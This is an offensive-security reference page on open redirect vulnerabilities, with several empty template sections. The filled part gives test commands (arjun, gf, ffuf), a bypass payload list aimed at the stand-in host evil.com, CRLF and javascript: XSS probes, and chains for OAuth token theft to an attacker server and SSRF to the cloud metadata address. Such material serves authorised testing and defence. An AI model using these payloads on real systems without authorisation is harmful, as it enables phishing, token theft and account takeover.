# Open Redirect Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 0_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Open redirect — server-side logic follows a user-controlled URL parameter without validating destination, enabling phishing, OAuth token theft, and XSS chains.

## Surface

- Redirect params in query string: `redirect=`, `next=`, `return=`, `url=`, `dest=`, `go=`, `target=`, `rurl=`, `returnUrl=`, `continue=`
- OAuth 2.0 `redirect_uri` — attacker-controlled destination for authorization codes/tokens
- Post-login redirect: `/login?next=/dashboard` — what happens if `next=//evil.com`?
- Password reset return URL: `/reset?token=abc&returnTo=/home`
- 302 responses after form submission — watch `Location:` header
- Single-page app route params: `/#/redirect?to=https://evil.com`
- Meta refresh tags and JS-driven redirects set from query params

## Test Approach

1. **Discover redirect params** with arjun against every endpoint that returns a 3xx:

   ```
   arjun -u https://target.com/login -m GET
   ```

2. **Baseline test** — send `redirect=https://evil.com`, check if `Location:` header or JS redirect goes there
3. **Try bypass variants** for regex/domain filters (see Payloads)
4. **Bulk test with gf + ffuf** — extract all redirect params from crawl output:

   ```
   cat urls.txt | gf redirect | ffuf -u FUZZ -w /dev/stdin -mr "evil\.com"
   ```

5. **Burp match/replace** — set rule: replace `redirect=https://target.com` with `redirect=//evil.com` across all in-scope requests; observe which flows allow it
6. **Test OAuth redirect_uri separately** — enumerate registered patterns, try path traversal:

   ```
   redirect_uri=https://target.com/callback/../../../evil.com
   redirect_uri=https://target.com/callback%0d%0aLocation:https://evil.com
   ```

7. **Escalate to XSS** — try `javascript:alert(document.domain)` in redirect param; some frameworks pass it to `window.location` unsanitized

## Tools

- **arjun** — parameter discovery on target URLs; `arjun -u https://target.com/login -m GET --stable`
- **gf** — grep known redirect param patterns from crawl output; `gf redirect urls.txt`
- **Burp match/replace** — swap redirect destinations in bulk across session; rule: `Request Header → Location value`
- **ffuf** — fuzz redirect param values with wordlist of bypass payloads; `-mr "Location: .*evil"` to flag hits

## Payloads / Probes

```
# Bare protocol-relative
//evil.com
//evil.com/path

# Double slash with encoded slash
\/\/evil.com
/\evil.com

# @-trick — browser resolves host as evil.com
https://target.com@evil.com
https://target.com%40evil.com

# Fragment trick — browser discards fragment on server, client follows
https://evil.com%23target.com
https://evil.com#target.com

# Encoded slash bypass
https:%2F%2Fevil.com
https:%2f%2fevil.com

# Double-encoded
https:%252F%252Fevil.com

# XSS via javascript: URI (if reflected to window.location)
javascript:alert(document.domain)
javascript://comment%0aalert(1)

# Path-based open redirect
/redirect?to=/evil.com
```

## Chain Opportunities

- **Open redirect → OAuth token theft** — set `redirect_uri` to open redirect URL on target, authorization code/token lands at attacker server: `redirect_uri=https://target.com/redirect?url=https://evil.com`
- **Open redirect → phishing** — trusted domain in URL bar until final redirect; high success rate against non-technical targets
- **Open redirect → SSRF bypass** — if server-side follows the redirect, use `//169.254.169.254` or internal hostnames
- **Open redirect + `javascript:` → XSS** — JS frameworks that call `window.location = param` without validation execute attacker JS in origin context
- **Open redirect → CSRF chain** — embed redirect in CSRF PoC to obscure final destination from victim

## Recent Intel

- **CVE-2023-24488** · Citrix ADC/Gateway open redirect via `login.do` and `oauth` endpoints · unauthenticated, used in phishing campaigns targeting Citrix SSO · CVSS 6.1
- **OAuth redirect_uri bypass patterns** · PortSwigger research 2024 · regex-based allowlists commonly bypassed via path traversal (`/callback/../attacker`), CRLF injection, and subdomain prefix tricks (`target.com.evil.com`)
- **HackerOne Hacktivity 2024** · open redirect in post-auth `returnTo` param chained with OAuth implicit flow → account takeover without any user interaction beyond clicking a link
